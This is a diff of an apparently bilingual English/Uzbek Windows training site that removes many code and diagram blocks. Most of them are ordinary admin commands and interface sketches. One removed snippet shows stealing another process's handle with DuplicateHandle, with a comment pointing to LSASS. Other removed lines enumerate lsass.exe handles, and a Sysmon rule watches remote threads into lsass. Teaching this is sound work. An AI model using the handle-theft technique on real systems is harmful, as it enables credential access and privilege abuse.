-  Select-Object Id, StartAddress, ThreadState, WaitReason | Format-Table
-
-# WinDbg — barcha thread larni ko'rish
-!process 0 0 notepad.exe   # EPROCESS topish
-.process /r /p <eprocess>  # joriy jarayon o'zgartirish
-~*                          # barcha thread lar
-~0 kb                       # 0-thread steki
-
-# Sysmon CreateRemoteThread (Event 8) kuzatish
-# sysmonconfig.xml da:
-# <CreateRemoteThread onmatch="include">
-#   <TargetImage condition="is">lsass.exe</TargetImage>
-# </CreateRemoteThread>`}</code></pre>
     </section>
   );
 }
@@ -4410,16 +4124,6 @@ function SectionHandles() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — Object Manager and OBJECT_HEADER</h3>
       <P>Every kernel object is preceded in kernel memory by an <Term>OBJECT_HEADER</Term> structure. The Object Manager (<code>ObXxx</code> routines in ntoskrnl.exe) manages creation, reference counting, and destruction of these objects.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`typedef struct _OBJECT_HEADER {
-  LONG_PTR     PointerCount;   // Total kernel references (including handles)
-  LONG_PTR     HandleCount;    // Number of open handles (across all processes)
-  POBJECT_TYPE Type;           // Points to FILE, PROCESS, THREAD, TOKEN, EVENT… type
-  UCHAR        NameInfoOffset; // Optional: optional header with object name
-  UCHAR        HandleInfoOffset;
-  UCHAR        QuotaInfoOffset;
-  UCHAR        Flags;
-  // Immediately followed by the actual object body (e.g., _FILE_OBJECT)
-} OBJECT_HEADER;`}</code></pre>
       <P>The Object Manager lives in the kernel's <em>Object Namespace</em> — a directory tree rooted at <code>\</code>. You can browse it with WinObj (Sysinternals) or <code>!object \</code> in WinDbg. Common directories:</P>
       <div style={{overflowX:"auto",marginTop:12}}>
         <table style={{width:"100%",borderCollapse:"collapse",fontSize:13}}>
@@ -4484,18 +4188,6 @@ function SectionHandles() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.4 — Handle Duplication and Inheritance</h3>
       <P><Term>DuplicateHandle</Term> copies a handle from one process's table to another process's table. The duplicated handle refers to the same underlying kernel object; the object's <code>HandleCount</code> increments. The caller needs <code>PROCESS_DUP_HANDLE</code> on both source and target processes.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`// Steal a handle from another process (requires PROCESS_DUP_HANDLE on victim)
-HANDLE hVictim = OpenProcess(PROCESS_DUP_HANDLE, FALSE, victimPid);
-HANDLE hStolen;
-DuplicateHandle(
-    hVictim,         // source process
-    0x40,            // handle value inside victim (e.g., their LSASS handle)
-    GetCurrentProcess(),  // target process (us)
-    &hStolen,        // new handle value in our table
-    0, FALSE,
-    DUPLICATE_SAME_ACCESS   // copy whatever access victim had
-);
-// hStolen now has the same rights as victim's handle`}</code></pre>
       <P><Term>Inheritable handles</Term>: when a process is created with <code>CreateProcess</code> and <code>bInheritHandles=TRUE</code>, all handles marked <code>HANDLE_FLAG_INHERIT</code> are duplicated into the child's table with the same access rights. This is how stdin/stdout/stderr pipes work — the parent creates pipe handles, marks them inheritable, and passes their values in <code>STARTUPINFO</code>.</P>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — Handle Leaks</h3>
@@ -4585,23 +4277,6 @@ DuplicateHandle(
       </Callout>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.8 — Practical Commands</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# List all handles for a process (Process Hacker CLI / NtQuerySystemInformation)
-handle.exe -p lsass.exe          # Sysinternals handle.exe
-handle64.exe -a -p notepad.exe   # all handle types
-
-# WinDbg — inspect handle table
-!process 0 0 lsass.exe   # get EPROCESS
-.process /r /p <eprocess>
-!handle 0 0xf             # all handles: 0 = all, 0xf = full info
-
-# PowerShell — count handles (cheap leak monitor)
-Get-Process | Select-Object Name, HandleCount | Sort-Object HandleCount -Descending | Select -First 20
-
-# ETW handle tracking (requires Admin)
-logman start HandleTrace -p "Microsoft-Windows-Kernel-Object" 0xFFFF 5 -ets
-# ... reproduce leak ...
-logman stop HandleTrace -ets
-tracerpt HandleTrace.etl -o handles.xml`}</code></pre>
     </section>
   ) : (
     <section>
@@ -4610,16 +4285,6 @@ tracerpt HandleTrace.etl -o handles.xml`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — Ob'ekt Menejeri va OBJECT_HEADER</h3>
       <P>Har bir kernel ob'ekti kernel xotirasida <Term>OBJECT_HEADER</Term> tuzilmasi bilan boshlanadi. Ob'ekt Menejeri (ntoskrnl.exe dagi <code>ObXxx</code> routinelari) bu ob'ektlarning yaratilishi, havolalarni sanash va yo'q qilinishini boshqaradi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`typedef struct _OBJECT_HEADER {
-  LONG_PTR     PointerCount;   // Jami kernel havolalari (handlelar bilan birga)
-  LONG_PTR     HandleCount;    // Ochiq handlelar soni (barcha jarayonlarda)
-  POBJECT_TYPE Type;           // FILE, PROCESS, THREAD, TOKEN, EVENT… turiga ko'rsatadi
-  UCHAR        NameInfoOffset; // Ixtiyoriy: ob'ekt nomi bilan ixtiyoriy sarlavha
-  UCHAR        HandleInfoOffset;
-  UCHAR        QuotaInfoOffset;
-  UCHAR        Flags;
-  // Darhol haqiqiy ob'ekt tanasi bilan davom etadi (masalan, _FILE_OBJECT)
-} OBJECT_HEADER;`}</code></pre>
       <P>Ob'ekt Menejeri kernelning <em>Ob'ekt Nomlar Fazosida</em> yashaydi — <code>\</code> dan boshlanadigan katalog daraxti. Uni WinObj (Sysinternals) yoki WinDbg da <code>!object \</code> bilan ko'rishingiz mumkin. Keng tarqalgan kataloglar:</P>
       <div style={{overflowX:"auto",marginTop:12}}>
         <table style={{width:"100%",borderCollapse:"collapse",fontSize:13}}>
@@ -4684,18 +4349,6 @@ tracerpt HandleTrace.etl -o handles.xml`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.4 — Handle Takrorlash va Meros</h3>
       <P><Term>DuplicateHandle</Term> handleni bir jarayon jadvalidan boshqa jarayon jadvaliga ko'chiradi. Takrorlangan handle bir xil kernel ob'ektiga ishora qiladi; ob'ektning <code>HandleCount</code> i ortadi. Chaqiruvchi manba va maqsad jarayonlarda <code>PROCESS_DUP_HANDLE</code> ga muhtoj.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`// Boshqa jarayondan handleni o'g'irlash (jabrlanuvchida PROCESS_DUP_HANDLE kerak)
-HANDLE hJabrlanuvchi = OpenProcess(PROCESS_DUP_HANDLE, FALSE, jabrlanuvchiPid);
-HANDLE hO_girlangan;
-DuplicateHandle(
-    hJabrlanuvchi,       // manba jarayon
-    0x40,                // jabrlanuvchi ichidagi handle qiymati (masalan, ularning LSASS handlesi)
-    GetCurrentProcess(), // maqsad jarayon (biz)
-    &hO_girlangan,       // bizning jadvalidagi yangi handle qiymati
-    0, FALSE,
-    DUPLICATE_SAME_ACCESS   // jabrlanuvchi qanday kirish huquqiga ega bo'lsa shuni ko'chirish
-);
-// hO_girlangan endi jabrlanuvchi handlesi bilan bir xil huquqlarga ega`}</code></pre>
       <P><Term>Merosiy handlelar</Term>: jarayon <code>CreateProcess</code> va <code>bInheritHandles=TRUE</code> bilan yaratilganda, <code>HANDLE_FLAG_INHERIT</code> bilan belgilangan barcha handlelar bir xil kirish huquqlari bilan bolaning jadvaliga takrorlanadi. stdin/stdout/stderr quvurlari shunday ishlaydi — ota endi quvur handlelarini yaratadi, ularni merosiy deb belgilaydi va qiymatlarini <code>STARTUPINFO</code> da uzatadi.</P>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — Handle Sizishi</h3>
@@ -4717,23 +4370,6 @@ DuplicateHandle(
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Amaliy Buyruqlar</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Jarayon uchun barcha handlelarni ro'yxatga olish
-handle.exe -p lsass.exe          # Sysinternals handle.exe
-handle64.exe -a -p notepad.exe   # barcha handle turlari
-
-# WinDbg — handle jadvalini tekshirish
-!process 0 0 lsass.exe   # EPROCESS topish
-.process /r /p <eprocess>
-!handle 0 0xf             # barcha handlelar: 0 = hammasi, 0xf = to'liq ma'lumot
-
-# PowerShell — handlelarni hisoblash (sizish monitori)
-Get-Process | Select-Object Name, HandleCount | Sort-Object HandleCount -Descending | Select -First 20
-
-# ETW orqali handle kuzatish (Admin kerak)
-logman start HandleTrace -p "Microsoft-Windows-Kernel-Object" 0xFFFF 5 -ets
-# ... sizishni takrorlash ...
-logman stop HandleTrace -ets
-tracerpt HandleTrace.etl -o handles.xml`}</code></pre>
     </section>
   );
 }
@@ -4751,14 +4387,6 @@ function SectionWinIntro() {
         memory, storage, input devices, and the graphical interface you interact with every day.
         Windows is the most widely used desktop OS on Earth, running on over <Em>1.5 billion</Em> active devices.
       </P>
-      <pre><code>{`
-  ┌─────────────────────────────────────────┐
-  │          Your Applications              │  ← Office, Chrome, Games
-  ├─────────────────────────────────────────┤
-  │         Windows OS (Kernel)             │  ← Manages everything below
-  ├──────────────┬──────────────────────────┤
-  │     CPU      │  RAM   │  Disk  │  GPU   │  ← Hardware
-  └──────────────┴──────────────────────────┘`}</code></pre>
       <H2 num="§2" en="What Does Windows Do?" uz="" />
       <P>Windows handles five core responsibilities:</P>
       <ul>
@@ -4798,14 +4426,6 @@ function SectionWinIntro() {
         va grafik interfeysni boshqaradi. Windows dunyoda eng ko'p ishlatiladigan ish stoli OT bo'lib,
         <Em>1,5 milliarddan ortiq</Em> qurilmada ishlaydi.
       </P>
-      <pre><code>{`
-  ┌─────────────────────────────────────────┐
-  │           Dasturlaringiz                │  ← Office, Chrome, O'yinlar
-  ├─────────────────────────────────────────┤
-  │       Windows OT (Yadro/Kernel)         │  ← Hamma narsani boshqaradi
-  ├──────────────┬──────────────────────────┤
-  │     CPU      │  RAM   │  Disk  │  GPU   │  ← Qurilma
-  └──────────────┴──────────────────────────┘`}</code></pre>
       <H2 num="§2" uz="Windows nima qiladi?" en="" />
       <P>Windows beshta asosiy vazifani bajaradi:</P>
       <ul>
@@ -4846,12 +4466,6 @@ function SectionWinVersions() {
     <section>
       <H2 num="§1" en="Windows Version History" uz="" />
       <P>Understanding the Windows timeline helps you support legacy systems and choose the right OS for each workload.</P>
-      <pre><code>{`
-  Windows XP (2001) ──► Vista (2007) ──► 7 (2009) ──► 8/8.1 (2012)
-       ↓
-  Windows 10 (2015) ──────────────────────────────────► Still supported
-       ↓
-  Windows 11 (2021) ─── TPM 2.0 required ─────────────► Current`}</code></pre>
       <table>
         <thead><tr><th>Version</th><th>Released</th><th>EOL</th><th>Notable</th></tr></thead>
         <tbody>
@@ -4883,12 +4497,6 @@ function SectionWinVersions() {
     <section>
       <H2 num="§1" uz="Windows versiyalari tarixi" en="" />
       <P>Windows tarixini bilish eski tizimlarni qo'llab-quvvatlash va har bir ish uchun to'g'ri OT tanlashga yordam beradi.</P>
-      <pre><code>{`
-  Windows XP (2001) ──► Vista (2007) ──► 7 (2009) ──► 8/8.1 (2012)
-       ↓
-  Windows 10 (2015) ──────────────────────────────────► Hali qo'llaniladi
-       ↓
-  Windows 11 (2021) ─── TPM 2.0 talab ────────────────► Joriy versiya`}</code></pre>
       <table>
         <thead><tr><th>Versiya</th><th>Chiqarilgan</th><th>Qo'llab-quvvatlash tugashi</th><th>Muhim</th></tr></thead>
         <tbody>
@@ -4947,22 +4555,6 @@ function SectionWinInstall() {
         <li>Wait for download + formatting (15-30 min)</li>
       </ol>
       <H2 num="§3" en="Clean Installation Steps" uz="" />
-      <pre><code>{`
-  Boot from USB
-       ↓
-  Language / Time / Keyboard → Next
-       ↓
-  Install Now → Enter product key (or skip)
-       ↓
-  Custom: Install Windows only (advanced)
-       ↓
-  Select/format partition → Next
-       ↓
-  Windows installs (reboots 2-3×)
-       ↓
-  OOBE: region, keyboard, account setup
-       ↓
-  Desktop appears — install drivers!`}</code></pre>
       <H2 num="§4" en="Post-Install Checklist" uz="" />
       <ul>
         <li>Check Device Manager for unknown devices</li>
@@ -4998,22 +4590,6 @@ function SectionWinInstall() {
         <li>Yuklab olish + formatlashni kuting (15-30 daqiqa)</li>
       </ol>
       <H2 num="§3" uz="Toza o'rnatish qadamlari" en="" />
-      <pre><code>{`
-  USB dan yuklash
-       ↓
-  Til / Vaqt / Klaviatura → Keyingi
-       ↓
-  Hozir o'rnating → Mahsulot kalitini kiriting (yoki o'tkazib yuboring)
-       ↓
-  Maxsus: Faqat Windowsni o'rnating (kengaytirilgan)
-       ↓
-  Qism tanlash/formatlash → Keyingi
-       ↓
-  Windows o'rnatiladi (2-3× qayta yuklaydi)
-       ↓
-  OOBE: hudud, klaviatura, hisob sozlamalari
-       ↓
-  Ish stoli ko'rinadi — drayvlarni o'rnating!`}</code></pre>
       <H2 num="§4" uz="O'rnatishdan keyingi nazorat ro'yxati" en="" />
       <ul>
         <li>Device Manager da noma'lum qurilmalarni tekshiring</li>
@@ -5045,17 +4621,6 @@ function SectionGPTMBR() {
         </tbody>
       </table>
       <H2 num="§2" en="Disk Layout Diagram" uz="" />
-      <pre><code>{`
-  GPT Disk Layout:
-  ┌──────────┬────────────────┬──────────────┬───────┬──────────┐
-  │Prot. MBR │  GPT Header    │  Partitions  │  ...  │ Backup   │
-  │ (sector 0│  (sector 1)    │ EFI | C: | D:│       │ GPT hdr  │
-  └──────────┴────────────────┴──────────────┴───────┴──────────┘
-
-  EFI System Partition (ESP) — ~100 MB — holds bootloader
-  MSR — Microsoft Reserved — ~16 MB
-  C: Windows — main OS partition
-  Recovery — ~500 MB — WinRE`}</code></pre>
       <H2 num="§3" en="Disk Management GUI" uz="" />
       <P>Open with: <Em>Win+X → Disk Management</Em> (or <code>diskmgmt.msc</code>)</P>
       <ul>
@@ -5092,17 +4657,6 @@ function SectionGPTMBR() {
         </tbody>
       </table>
       <H2 num="§2" uz="Disk tartibi diagramasi" en="" />
-      <pre><code>{`
-  GPT Disk tartibi:
-  ┌──────────┬────────────────┬──────────────┬───────┬──────────┐
-  │Him. MBR  │  GPT sarlavhasi│  Bo'limlar   │  ...  │ Zaxira   │
-  │(sektor 0)│  (sektor 1)    │ EFI | C: | D:│       │ GPT sarl.│
-  └──────────┴────────────────┴──────────────┴───────┴──────────┘
-
-  EFI tizim bo'limi (ESP) — ~100 MB — yuklash boshqaruvchisi
-  MSR — Microsoft ajratilgan — ~16 MB
-  C: Windows — asosiy OT bo'limi
-  Tiklash — ~500 MB — WinRE`}</code></pre>
       <H2 num="§3" uz="Disk Management grafik interfeysi" en="" />
       <P>Ochish: <Em>Win+X → Disk Management</Em> (yoki <code>diskmgmt.msc</code>)</P>
       <ul>
@@ -5135,15 +4689,6 @@ function SectionDesktopEnv() {
     <section>
       <H2 num="§1" en="The Windows Desktop Environment" uz="" />
       <P>The Windows desktop is your primary workspace. It consists of several interconnected components managed by the <Term>Windows Shell</Term> (explorer.exe).</P>
-      <pre><code>{`
-  ┌─────────────────────────────────────────────────────────┐
-  │                    Desktop (wallpaper)                   │
-  │  ┌────────────────────────────────────────────────────┐  │
-  │  │  Icons: This PC, Recycle Bin, shortcuts            │  │
-  │  └────────────────────────────────────────────────────┘  │
-  ├─────────────────────────────────────────────────────────┤
-  │ [⊞Start] [Search] [TaskView] [Pinned Apps]  [Tray] [🔔] │  ← Taskbar
-  └─────────────────────────────────────────────────────────┘`}</code></pre>
       <H2 num="§2" en="Start Menu" uz="" />
       <P>Press <Em>Win</Em> or click the Start button. In Windows 11:</P>
       <ul>
@@ -5192,15 +4737,6 @@ function SectionDesktopEnv() {
     <section>
       <H2 num="§1" uz="Windows ish stoli muhiti" en="" />
       <P>Windows ish stoli — asosiy ish maydoningiz. U <Term>Windows Shell</Term> (explorer.exe) tomonidan boshqariladigan bir necha o'zaro bog'liq komponentlardan iborat.</P>
-      <pre><code>{`
-  ┌─────────────────────────────────────────────────────────┐
-  │               Ish stoli (fon rasm)                      │
-  │  ┌────────────────────────────────────────────────────┐  │
-  │  │  Ikonalar: Bu kompyuter, Savat, qisqichalar        │  │
-  │  └────────────────────────────────────────────────────┘  │
-  ├─────────────────────────────────────────────────────────┤
-  │ [⊞Start] [Qidiruv] [TaskView] [Pinlangan]  [Tray] [🔔] │  ← Vazifalar paneli
-  └─────────────────────────────────────────────────────────┘`}</code></pre>
       <H2 num="§2" uz="Start menyusi" en="" />
       <P><Em>Win</Em> tugmasini bosing yoki Start tugmasini bosing. Windows 11 da:</P>
       <ul>
@@ -5255,16 +4791,6 @@ function SectionFileExplorer() {
     <section>
       <H2 num="§1" en="File Explorer Overview" uz="" />
       <P><Term>File Explorer</Term> (explorer.exe) is the built-in file manager for browsing drives, folders, and files. Open it with <Em>Win+E</Em> or from the taskbar.</P>
-      <pre><code>{`
-  ┌────────────────────────────────────────────────────────┐
-  │ ← → ↑  │  C:\Users\Alice\Documents        │ 🔍 Search │
-  ├─────────┼─────────────────────────────────────────────┤
-  │ Quick   │  Name        │ Date modified │ Size │ Type  │
-  │ Access  ├─────────────────────────────────────────────┤
-  │ OneDrive│  📁 Projects  │ 5/17/2026    │      │ Folder│
-  │ This PC │  📄 report.docx│ 5/16/2026   │ 45KB │ Word  │
-  │ Network │  📊 data.xlsx  │ 5/15/2026   │ 12KB │ Excel │
-  └─────────┴─────────────────────────────────────────────┘`}</code></pre>
       <H2 num="§2" en="Navigation and Views" uz="" />
       <ul>
         <li><Em>Address bar</Em> — click to type a path directly (e.g., <code>C:\Windows\System32</code>)</li>
@@ -5306,16 +4832,6 @@ function SectionFileExplorer() {
     <section>
       <H2 num="§1" uz="File Explorer umumiy ko'rinishi" en="" />
       <P><Term>File Explorer</Term> (explorer.exe) — disklar, papkalar va fayllarni ko'rish uchun o'rnatilgan fayl menejeri. <Em>Win+E</Em> yoki vazifalar panelidan oching.</P>
-      <pre><code>{`
-  ┌────────────────────────────────────────────────────────┐
-  │ ← → ↑  │  C:\Users\Ali\Documents           │ 🔍 Qidiruv│
-  ├─────────┼─────────────────────────────────────────────┤
-  │ Tezkor  │  Nomi       │ O'zg. sanasi │ Hajmi│  Turi   │
-  │ Kirish  ├─────────────────────────────────────────────┤
-  │ OneDrive│  📁 Loyihalar │ 17.05.2026  │      │ Papka   │
-  │ Bu komp.│  📄 hisobot.docx│ 16.05.2026│ 45KB │ Word   │
-  │ Tarmoq  │  📊 ma'lumot.xlsx│15.05.2026 │ 12KB│ Excel  │
-  └─────────┴─────────────────────────────────────────────┘`}</code></pre>
       <H2 num="§2" uz="Navigatsiya va ko'rinishlar" en="" />
       <ul>
         <li><Em>Manzil satri</Em> — to'g'ridan-to'g'ri yo'l kiriting (masalan, <code>C:\Windows\System32</code>)</li>
@@ -5856,17 +5372,6 @@ function SectionDefenderBasic() {
     <section>
       <H2 num="§1" en="Windows Security Center" uz="" />
       <P><Term>Windows Security</Term> (formerly Windows Defender) is the built-in security suite in Windows 10/11. Open it: <Em>Start → Windows Security</Em> or the shield icon in the system tray.</P>
-      <pre><code>{`
-  Windows Security Dashboard
-  ┌─────────────────────────────────────────────┐
-  │ 🛡 Virus & threat protection    ✔ No action │
-  │ 🔒 Account protection           ✔ Good      │
-  │ 🌐 Firewall & network           ✔ On        │
-  │ 📱 App & browser control        ✔ On        │
-  │ 🖥 Device security              ✔ On        │
-  │ ⚡ Device performance           ✔ Good      │
-  │ 👨‍👩‍👧 Family options             ─ Optional  │
-  └─────────────────────────────────────────────┘`}</code></pre>
       <H2 num="§2" en="Virus and Threat Protection" uz="" />
       <P>The core antivirus engine. Key actions:</P>
       <ul>
@@ -5906,17 +5411,6 @@ function SectionDefenderBasic() {
     <section>
       <H2 num="§1" uz="Windows Security markazi" en="" />
       <P><Term>Windows Security</Term> (ilgari Windows Defender) — Windows 10/11 da o'rnatilgan xavfsizlik to'plami. Oching: <Em>Start → Windows Security</Em> yoki tizim belgisidagi qalqon ikonasi.</P>
-      <pre><code>{`
-  Windows Security boshqaruv paneli
-  ┌─────────────────────────────────────────────┐
-  │ 🛡 Virus va tahdidlardan himoya  ✔ Yaxshi   │
-  │ 🔒 Hisob himoyasi               ✔ Yaxshi    │
-  │ 🌐 Xavfsizlik devori va tarmoq  ✔ Yoqilgan  │
-  │ 📱 Dastur va brauzer nazorati   ✔ Yoqilgan  │
-  │ 🖥 Qurilma xavfsizligi          ✔ Yoqilgan  │
-  │ ⚡ Qurilma ishlashi             ✔ Yaxshi    │
-  │ 👨‍👩‍👧 Oilaviy parametrlar        ─ Ixtiyoriy │
-  └─────────────────────────────────────────────┘`}</code></pre>
       <H2 num="§2" uz="Virus va tahdidlardan himoya" en="" />
       <P>Asosiy antivirus mexanizmi. Asosiy harakatlar:</P>
       <ul>
@@ -5987,24 +5481,7 @@ function SectionNetBasic() {
         </tbody>
       </table>
       <H2 num="§4" en="Essential Network Commands" uz="" />
-      <pre><code>{`ipconfig              # Show all IP configuration
-ipconfig /all         # Full details including MAC, DHCP server
-ipconfig /release     # Release DHCP lease
-ipconfig /renew       # Renew DHCP lease (fixes many connectivity issues)
-ipconfig /flushdns    # Clear DNS cache (fixes DNS resolution issues)
-
-ping 8.8.8.8          # Test internet connectivity
-ping google.com       # Test DNS + internet
-ping 192.168.1.1      # Test gateway connectivity`}</code></pre>
       <H2 num="§5" en="Network Troubleshooting Workflow" uz="" />
-      <pre><code>{`
-  No network? Follow this sequence:
-  1. ipconfig → Do you have an IP? (169.x.x.x = no DHCP)
-  2. ping 127.0.0.1  → TCP/IP stack working?
-  3. ping [gateway]  → Router reachable?
-  4. ping 8.8.8.8    → Internet reachable?
-  5. ping google.com → DNS working?
-  → Each step pinpoints where the break is.`}</code></pre>
       <Callout kind="tip">Settings → Network &amp; internet → Troubleshoot → Internet Connections runs the built-in wizard. It fixes most common issues automatically.</Callout>
     </section>
   ) : (
@@ -6035,24 +5512,7 @@ ping 192.168.1.1      # Test gateway connectivity`}</code></pre>
         </tbody>
       </table>
       <H2 num="§4" uz="Muhim tarmoq buyruqlari" en="" />
-      <pre><code>{`ipconfig              # Barcha IP konfiguratsiyani ko'rsatish
-ipconfig /all         # MAC, DHCP server bilan to'liq tafsilotlar
-ipconfig /release     # DHCP ijarasini bo'shatish
-ipconfig /renew       # DHCP ijarasini yangilash (ko'p ulanish muammolarini tuzatadi)
-ipconfig /flushdns    # DNS keshini tozalash (DNS muammolarini tuzatadi)
-
-ping 8.8.8.8          # Internet ulanishini tekshirish
-ping google.com       # DNS + internetni tekshirish
-ping 192.168.1.1      # Shlyuz ulanishini tekshirish`}</code></pre>
       <H2 num="§5" uz="Tarmoq muammolarini hal qilish tartibi" en="" />
-      <pre><code>{`
-  Tarmoq yo'qmi? Quyidagi ketma-ketlikni bajaring:
-  1. ipconfig → IP manzilingiz bormi? (169.x.x.x = DHCP yo'q)
-  2. ping 127.0.0.1  → TCP/IP steki ishlayaptimi?
-  3. ping [shlyuz]   → Router erishish mumkinmi?
-  4. ping 8.8.8.8    → Internetga erishish mumkinmi?
-  5. ping google.com → DNS ishlayaptimi?
-  → Har bir qadam qayerda uzilish borligini ko'rsatadi.`}</code></pre>
       <Callout kind="tip">Sozlamalar → Tarmoq va internet → Muammolarni bartaraf etish → Internet ulanishlari — o'rnatilgan ustani ishga tushiradi. Ko'pgina umumiy muammolarni avtomatik ravishda tuzatadi.</Callout>
     </section>
   );
@@ -6141,10 +5601,6 @@ function SectionBackupRestore() {
     <section>
       <H2 num="§1" en="Why Backup Matters" uz="" />
       <P>Hardware fails. Ransomware encrypts files. Users accidentally delete things. The <Term>3-2-1 backup rule</Term> is the gold standard:</P>
-      <pre><code>{`
-  3 copies of data
-  ├── 2 on different media (e.g., local drive + USB)
-  └── 1 offsite or cloud (e.g., OneDrive, external at different location)`}</code></pre>
       <H2 num="§2" en="System Restore" uz="" />
       <P><Term>System Restore</Term> creates snapshots called <Em>restore points</Em> of Windows system files and the registry. It does NOT back up personal files.</P>
       <ul>
@@ -6186,10 +5642,6 @@ function SectionBackupRestore() {
     <section>
       <H2 num="§1" uz="Nima uchun zaxiralash muhim" en="" />
       <P>Qurilma ishdan chiqadi. Ransomware fayllarni shifrlaydi. Foydalanuvchilar tasodifan o'chiradi. <Term>3-2-1 zaxiralash qoidasi</Term> oltin standart:</P>
-      <pre><code>{`
-  Ma'lumotlarning 3 nusxasi
-  ├── Turli muhitlarda 2 ta (masalan, mahalliy disk + USB)
-  └── 1 ta saytdan tashqarida yoki bulutda (masalan, OneDrive, tashqi)`}</code></pre>
       <H2 num="§2" uz="Tizimni tiklash" en="" />
       <P><Term>Tizimni tiklash</Term> (System Restore) — Windows tizim fayllari va ro'yxatga olish kitobining <Em>tiklash nuqtalari</Em> deb ataladigan suratlarini yaratadi. Shaxsiy fayllarni zaxiralamaydi.</P>
       <ul>
@@ -6254,27 +5706,9 @@ function SectionPSBasic() {
       </table>
       <H2 num="§3" en="The Pipeline" uz="" />
       <P>The <Term>pipeline</Term> (<code>|</code>) passes the output of one cmdlet as input to the next — but as objects, not text.</P>
-      <pre><code>{`# Find top 5 memory-consuming processes
-Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5
-
-# List all stopped services
-Get-Service | Where-Object {$_.Status -eq "Stopped"}
-
-# Get all .log files larger than 1MB
-Get-ChildItem C:\Windows\Logs -Recurse -Filter *.log |
-  Where-Object {$_.Length -gt 1MB}`}</code></pre>
       <H2 num="§4" en="Variables and Scripts" uz="" />
-      <pre><code>{`$name = "Alice"           # Assign variable
-$procs = Get-Process      # Assign cmdlet output
-Write-Host "Hello $name"  # Print with variable expansion
-
-# Save to .ps1 file and run:
-.\myscript.ps1`}</code></pre>
       <H2 num="§5" en="Execution Policy" uz="" />
       <P>By default, PowerShell blocks script execution for security. Check and set:</P>
-      <pre><code>{`Get-ExecutionPolicy           # Check current policy
-Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
-# RemoteSigned: local scripts run freely; downloaded scripts must be signed`}</code></pre>
       <Callout kind="warn">Never set ExecutionPolicy to Unrestricted in production. RemoteSigned is the standard safe setting for administrators.</Callout>
     </section>
   ) : (
@@ -6298,27 +5732,9 @@ Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
       </table>
       <H2 num="§3" uz="Quvur (Pipeline)" en="" />
       <P><Term>Quvur</Term> (<code>|</code>) bir cmdlet chiqishini keyingisiga kirish sifatida uzatadi — lekin matn sifatida emas, ob'ektlar sifatida.</P>
-      <pre><code>{`# Eng ko'p xotira ishlatadigan 5 ta jarayonni topish
-Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5
-
-# Barcha to'xtatilgan xizmatlarni ro'yxatlash
-Get-Service | Where-Object {$_.Status -eq "Stopped"}
-
-# 1 MB dan katta barcha .log fayllarni olish
-Get-ChildItem C:\Windows\Logs -Recurse -Filter *.log |
-  Where-Object {$_.Length -gt 1MB}`}</code></pre>
       <H2 num="§4" uz="O'zgaruvchilar va skriptlar" en="" />
-      <pre><code>{`$ism = "Ali"              # O'zgaruvchi tayinlash
-$jarayonlar = Get-Process # Cmdlet chiqishini tayinlash
-Write-Host "Salom $ism"   # O'zgaruvchi kengaytmasi bilan chop etish
-
-# .ps1 fayliga saqlang va ishga tushiring:
-.\mening_skriptim.ps1`}</code></pre>
       <H2 num="§5" uz="Bajarish siyosati" en="" />
       <P>Standart holda, PowerShell xavfsizlik uchun skript bajarishini bloklaydi. Tekshirish va o'rnatish:</P>
-      <pre><code>{`Get-ExecutionPolicy           # Joriy siyosatni tekshirish
-Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
-# RemoteSigned: mahalliy skriptlar erkin ishlaydi; yuklangan skriptlar imzolanishi kerak`}</code></pre>
       <Callout kind="warn">Hech qachon ishlab chiqarishda ExecutionPolicy ni Unrestricted ga o'rnatmang. RemoteSigned administratorlar uchun standart xavfsiz sozlama.</Callout>
     </section>
   );
@@ -6331,13 +5747,6 @@ function SectionRDP() {
     <section>
       <H2 num="§1" en="Remote Desktop Protocol Overview" uz="" />
       <P><Term>Remote Desktop Protocol (RDP)</Term> lets you connect to and control a remote Windows PC over a network, as if you were sitting in front of it. It runs on <Em>TCP port 3389</Em> and is built into all Windows Pro/Enterprise editions.</P>
-      <pre><code>{`
-  Your PC (RDP Client)          Remote PC (RDP Server)
-  ┌─────────────────┐           ┌──────────────────────┐
-  │ mstsc.exe       │──TCP 3389─►│ TermService (svchost)│
-  │ Remote Desktop  │           │ Displays remote       │
-  │ Connection app  │◄──screen──│ desktop to you        │
-  └─────────────────┘           └──────────────────────┘`}</code></pre>
       <H2 num="§2" en="Enabling RDP on the Target PC" uz="" />
       <ol>
         <li>Settings → System → <Em>Remote Desktop</Em></li>
@@ -6371,13 +5780,6 @@ function SectionRDP() {
     <section>
       <H2 num="§1" uz="Masofaviy ish stoli protokoli umumiy ko'rinishi" en="" />
